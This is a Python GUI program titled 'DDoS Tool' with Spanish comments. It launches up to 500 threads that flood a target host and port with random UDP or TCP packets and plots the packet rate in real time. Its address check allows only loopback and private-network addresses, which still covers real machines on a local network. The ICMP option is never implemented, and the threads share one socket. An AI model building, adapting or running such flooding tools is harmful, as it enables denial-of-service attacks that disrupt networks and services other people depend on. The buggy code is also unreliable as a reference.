from tkinter import *
from tkinter import ttk, messagebox
import socket
import os
import threading
from time import time, sleep
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

class DDoSApp:
    def __init__(self, root):
        self.root = root
        self.setup_ui()
        self.running = False
        self.requests = 0
        self.start_time = 0
        self.stop_event = threading.Event()
        self.socket = None
        self.time_data = []
        self.requests_data = []

    # ========== Configuración de la UI ========== #
    def setup_ui(self):
        self.root.title("DDoS Tool")
        self.root.geometry("700x625")
        self.root.configure(bg="#2d2d2d")
        self.root.iconbitmap(os.path.join(os.path.dirname(__file__), "icon.ico"))

        # Variables
        self.Host = StringVar()
        self.Port = StringVar(value="80")
        self.Threads = StringVar(value="10")
        self.Status = StringVar(value="Ready")
        self.start_stop_text = StringVar(value="Start Flooding")
        self.protocol = StringVar(value="UDP")
        self.simulation_mode = BooleanVar(value=False)
        self.max_pps = StringVar(value="1000")

        # Frame principal
        main_frame = Frame(self.root, bg="#2d2d2d")
        main_frame.pack(pady=15, padx=15, fill=BOTH, expand=True)

        # Sección de configuración
        config_frame = Frame(main_frame, bg="#3d3d3d", padx=10, pady=10)
        config_frame.grid(row=0, column=0, sticky="nsew")

        # Campos de entrada
        entries = [
            ("Host:", self.Host, 0, "Ejemplo: 127.0.0.1"),
            ("Port:", self.Port, 1, "Rango: 1-65535"),
            ("Threads:", self.Threads, 2, "Máximo 500"),
            ("Paq/seg:", self.max_pps, 3, "Límite de paquetes por segundo"),
        ]

        for text, var, row, tooltip in entries:
            Label(config_frame, text=text, bg="#3d3d3d", fg="white").grid(row=row, column=0, padx=5, pady=5, sticky=W)
            entry = Entry(config_frame, textvariable=var, width=15)
            entry.grid(row=row, column=1, padx=5, pady=5)
            ttk.Label(config_frame, text=tooltip, foreground="gray").grid(row=row, column=2, padx=5, sticky=W)

        # Selector de protocolo
        Label(config_frame, text="Protocolo:", bg="#3d3d3d", fg="white").grid(row=4, column=0, pady=5, sticky=W)
        OptionMenu(config_frame, self.protocol, "UDP", "TCP", "ICMP").grid(row=4, column=1, sticky=W)

        # Modo simulación
        Checkbutton(config_frame, text="Modo Simulación", variable=self.simulation_mode, 
                   bg="#3d3d3d", fg="white", selectcolor="#2d2d2d").grid(row=5, column=0, columnspan=2, pady=5)

        # Botones
        Button(config_frame, textvariable=self.start_stop_text, command=self.toggle_attack,
              bg="#404040", fg="white").grid(row=6, column=0, columnspan=2, pady=10, sticky=EW)

        # Gráfico en tiempo real
        self.fig, self.ax = plt.subplots(figsize=(5, 2))
        self.canvas = FigureCanvasTkAgg(self.fig, master=main_frame)
        self.canvas.get_tk_widget().grid(row=1, column=0, pady=10, sticky="nsew")

        # Consola de logs
        self.console = Text(main_frame, bg="black", fg="white", height=6)
        self.console.grid(row=2, column=0, sticky="ew")
        self.console.insert(END, "[Sistema] Inicializado correctamente\n")

    def validate_inputs(self):
        try:
            host = self.Host.get()
            resolved_ip = socket.gethostbyname(host)
            if not resolved_ip.startswith(("127.", "192.168.", "10.")):
                self.log_error("Solo se permiten hosts locales.")
                return False

            if not 1 <= int(self.Port.get()) <= 65535:
                raise ValueError("Puerto inválido")

            if int(self.Threads.get()) > 500 or int(self.Threads.get()) <= 0:
                raise ValueError("Hilos deben ser 1-500")

            return True
        except Exception as e:
            self.log_error(str(e))
            return False

    def attack(self):
        max_pps = int(self.max_pps.get())
        interval = 1 / max_pps if max_pps > 0 else 0
        protocol = self.protocol.get()

        try:
            if protocol == "UDP":
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            elif protocol == "TCP":
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.Host.get(), int(self.Port.get())))

            packet = os.urandom(1024) if not self.simulation_mode.get() else b""

            while not self.stop_event.is_set():
                if protocol == "UDP":
                    self.socket.sendto(packet, (self.Host.get(), int(self.Port.get())))
                elif protocol == "TCP":
                    self.socket.send(packet)
                
                self.requests += 1
                sleep(interval)

        except Exception as e:
            self.log_error(f"Fallo en el ataque: {str(e)}")
        finally:
            if self.socket:
                self.socket.close()

    def toggle_attack(self):
        if not self.validate_inputs():
            return

        if not self.running:
            self.running = True
            self.stop_event.clear()
            self.start_stop_text.set("Detener")
            self.requests = 0
            self.start_time = time()

            for _ in range(int(self.Threads.get())):
                thread = threading.Thread(target=self.attack, daemon=True)
                thread.start()

            self.update_stats()
        else:
            self.running = False
            self.stop_event.set()
            self.start_stop_text.set("Iniciar")
            self.Status.set(f"Detenido | Total: {self.requests}")

    def update_stats(self):
        if self.running:
            elapsed = time() - self.start_time
            self.time_data.append(elapsed)
            self.requests_data.append(self.requests)
            
            self.ax.clear()
            self.ax.plot(self.time_data, self.requests_data, color="cyan")
            self.ax.set_title("Paquetes enviados por segundo")
            self.canvas.draw()
            self.root.after(1000, self.update_stats)

    def log_error(self, message):
        self.console.insert(END, f"[ERROR] {message}\n")
        self.console.see(END)

if __name__ == "__main__":
    root = Tk()
    app = DDoSApp(root)
    root.mainloop()